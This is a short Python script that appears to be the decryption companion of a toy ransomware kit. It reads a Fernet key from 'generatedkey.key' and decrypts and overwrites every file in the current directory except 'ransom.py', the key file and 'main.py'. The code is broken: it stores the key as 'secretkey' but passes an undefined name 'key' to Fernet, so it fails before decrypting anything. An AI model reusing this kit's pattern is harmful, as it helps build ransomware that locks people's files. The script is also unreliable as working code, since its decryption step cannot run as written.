import os
from cryptography.fernet import Fernet


file_list = []

for file in os.listdir():
    if file == "ransom.py" or file == "generatedkey.key" or file == "main.py":
        continue
    if os.path.isfile(file):
        file_list.append(file)


with open("generatedkey.key","rb") as generatedkey:
    secretkey = generatedkey.read()


for file in file_list:
    with open(file,"rb") as the_file:
        contents = the_file.read()
    contents_decrypted = Fernet(key).decrypt(contents)
    with open(file,"wb") as the_file:
        the_file.write(contents_decrypted)